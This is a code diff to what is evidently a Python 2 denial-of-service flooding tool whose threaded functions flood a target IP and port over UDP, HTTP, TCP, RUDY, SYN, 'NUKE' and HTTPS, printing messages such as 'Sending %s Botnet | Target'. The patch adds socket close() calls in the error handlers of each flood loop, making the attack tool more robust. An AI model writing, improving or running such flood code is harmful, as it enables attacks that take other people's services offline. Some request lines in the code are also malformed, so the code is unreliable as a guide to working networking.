@@ -56,6 +56,7 @@ while True:
                 except KeyboardInterrupt:
                     exit()
                 except:
+                    udp.close()
                     print "\033[1;33m[ UDP ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
             for i in range(thread):
                 thr = threading.Thread(target=fluud)
@@ -79,6 +80,8 @@ while True:
                             http.send(byte)    
                         print "\033[1;91mSending %s Botnet | Target %s Port %s"%(sent,ip,port)
                     except:
+                        rudy2.close()
+                        http.close()
                         print "\033[1;33m[ HTTP ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
             for i in range(thread):
                 thr = threading.Thread(target=flood)
@@ -100,6 +103,7 @@ while True:
                     except KeyboardInterrupt:
                         exit()
                     except:
+                        tcp.close()
                         print "\033[1;33m[ TCP ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
             for i in range(thread):
                 thr = threading.Thread(target=flttd)
@@ -124,6 +128,8 @@ while True:
                             http.send(byte)    
                         print "\033[1;33m[ RUDY ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
                     except:
+                        rudy2.close()
+                        http.close()
                         print "\033[1;33m[ RUDY ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
             for i in range(thread):
                 thread = threading.Thread(target=rudy)
@@ -148,6 +154,9 @@ while True:
                         s2.send(("Host: "+i+"\r\n\r\n").encode("ascii"), (ip,port))
                         s3.sendto(byte, (ip,port))
                     except:
+                        s.close()
+                        s2.close()
+                        s3.close()
                         print "\033[1;33m[ SYN ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
             for i in range(thread):
                 thd = threading.Thread(target=syn)
@@ -173,6 +182,8 @@ while True:
                         s.send(("GET /1.1/HTTP/1.2\r\n\r\n").encode("ascii"), (ip,port))
                         s.send(("Host: "+i+"\r\n\r\n").encode("ascii"), (ip,port))
                     except:
+                        s.close()
+                        s2.close()
                         print "\033[1;33m[ NUKE ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
             for i in range(thread):
                 thd = threading.Thread(target=nuke)
@@ -198,6 +209,8 @@ while True:
                         ht.send(byte)
                         ht.send(byte2)
                     except:
+                        ht.close()
+                        udp.close()
                         print "\033[1;33m[ HTTPS ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s sent : %s"%(sent,ip,port)
             for i in range(thread):
                 thd = threading.Thread(target=https)
